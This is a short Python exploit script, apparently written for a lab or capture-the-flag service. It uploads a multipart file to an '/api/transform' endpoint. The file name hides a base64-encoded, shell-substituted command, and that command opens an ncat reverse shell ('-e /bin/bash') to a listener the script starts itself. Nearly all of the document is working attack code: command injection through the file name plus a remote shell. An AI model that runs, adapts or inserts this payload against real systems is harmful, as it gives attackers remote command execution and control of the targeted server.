from base64 import b64encode
from requests import post
from subprocess import Popen

ip = "127.0.0.1"
command = ("ncat %s 4242 -e /bin/bash" % ip).encode("UTF-8")
encoded = b64encode(command).decode("UTF-8")
payload = "$(eval echo %s$(python -c'print(chr(124))')base64 -d)" % encoded
image = ";%s;.jpg" % payload

target = "http://127.0.0.1:8080/api/transform"
boundary = "----WebKitFormBoundaryxdtnUlgb5bjZx1ep"

data = """
--{0}
Content-Disposition: form-data; name="file"; filename="{1}"
Content-Type: application/octet-stream


--{0}--
""".format(boundary, image)

headers = {
    "Content-Type": "multipart/form-data; boundary={}".format(boundary)
}

proc = Popen(["ncat", "-lvp", "4242"])
post(target, data=data, headers=headers)
proc.wait()
